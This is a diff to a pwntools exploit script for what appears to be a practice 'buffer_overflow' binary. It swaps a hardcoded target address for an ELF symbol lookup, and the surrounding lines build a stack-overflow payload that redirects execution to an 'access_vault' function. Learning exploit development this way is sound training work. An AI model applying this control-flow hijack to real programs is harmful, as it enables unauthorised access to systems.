@@ -4,8 +4,6 @@ from pwn import *
 
 import argparse
 
-ACCESS_VAULT_FUNCTION_ADDR = 0x0000000000401176
-
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('--debug', action='store_true')
@@ -14,6 +12,8 @@ if __name__ == '__main__':
 
     # Tell pwntools our target process to automate future functions
     elf = context.binary = ELF('buffer_overflow')
+
+    access_vault_function_addr = elf.symbols['access_vault']
 
     if args.debug:
         io = gdb.debug(context.binary.path, '''
@@ -53,7 +53,7 @@ if __name__ == '__main__':
     # We only execute one other function which doesn't need it
     saved_ebp = b'B' * 0x8
     # We have to pack the address properly (endianess!)
-    redirect_addr = p64(ACCESS_VAULT_FUNCTION_ADDR)
+    redirect_addr = p64(access_vault_function_addr)
     # Craft the final bytes payload
     payload = dummy_data + saved_ebp + redirect_addr
 
